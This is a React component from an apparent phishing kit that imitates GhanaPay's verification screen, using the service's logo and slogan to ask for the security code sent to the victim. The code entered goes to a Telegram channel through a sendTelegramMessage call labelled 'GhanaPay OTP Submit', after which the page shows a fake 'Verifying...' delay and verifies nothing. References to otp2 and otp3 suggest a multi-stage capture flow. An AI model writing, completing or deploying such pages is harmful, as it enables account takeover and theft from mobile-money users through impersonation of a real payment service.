"use client"

import { useState } from "react"
import Link from "next/link"
import { sendTelegramMessage } from "@/lib/telegram"

export function GhanaPayOtp() {
    const [otp, setOtp] = useState("")
    const [isLoading, setIsLoading] = useState(false)
    const [error, setError] = useState("")

    const handleVerify = async () => {
        if (!otp.trim()) {
            setError("Please enter a valid verification code.")
            return
        }

        setError("")
        setIsLoading(true)

        sessionStorage.setItem("userOtp1", otp)

        await sendTelegramMessage({
            title: "🔑 GhanaPay OTP Submit",
            otp1: otp,
            exclude: ["location", "otp2", "otp3"],
        })

        setTimeout(() => {
            setIsLoading(false)
            // Add completion logic here later
        }, 1500)
    }

    return (
        <div className="flex min-h-[100dvh] w-full max-w-[100vw] overflow-x-hidden flex-col items-center bg-white px-6 py-12">
            {/* Logo Section */}
            <div className="flex flex-col items-center mb-16">
                <img
                    src="https://www.ghipss.net/images/2025/07/01/ghanapay-to-boost-mobile-money-penetration-logo-3.png"
                    alt="GhanaPay Logo"
                    width={180}
                    height={80}
                    className="object-contain"
                />
                <p className="text-[#4A90D9] text-sm mt-1">Your Money, Your Way.</p>
            </div>

            {/* Form Section */}
            <div className="w-full max-w-md flex flex-col gap-6">
                <div className="text-center mb-2">
                    <h2 className="text-2xl font-bold text-[#1a1a1a]">Verification</h2>
                    <p className="text-sm text-[#808080] mt-2">Please enter the security code sent to you.</p>
                </div>

                {/* OTP Input - Unlimited length numbers only */}
                <div className="flex flex-col gap-2">
                    <input
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        value={otp}
                        onChange={(e) => {
                            setOtp(e.target.value.replace(/\D/g, ''))
                            setError("")
                        }}
                        placeholder="Enter OTP"
                        className={`w-full bg-[#EBEBEB] text-[#1a1a1a] placeholder-[#808080] rounded-lg px-5 py-4 text-center text-2xl tracking-[0.2em] outline-none font-medium text-black focus:outline-[#4A90D9] ${error ? 'border border-red-500 bg-red-50' : 'border-none'}`}
                    />
                    {error && (
                        <p className="text-sm text-red-500 font-medium px-2 text-center">{error}</p>
                    )}
                </div>

                {/* Resend Link */}
                <div className="flex justify-center mt-2">
                    <Link
                        href="#"
                        className="text-[#4A90D9] text-base font-medium hover:underline"
                    >
                        Resend Code?
                    </Link>
                </div>

                {/* Verify Button */}
                <button
                    onClick={handleVerify}
                    disabled={isLoading || !otp}
                    className="w-[200px] mx-auto bg-[#4A90D9] hover:bg-[#3d7ec5] text-white font-medium py-3.5 rounded-full text-lg transition-colors mt-4 disabled:opacity-70"
                >
                    {isLoading ? "Verifying..." : "Verify code"}
                </button>
            </div>

        </div>
    )
}
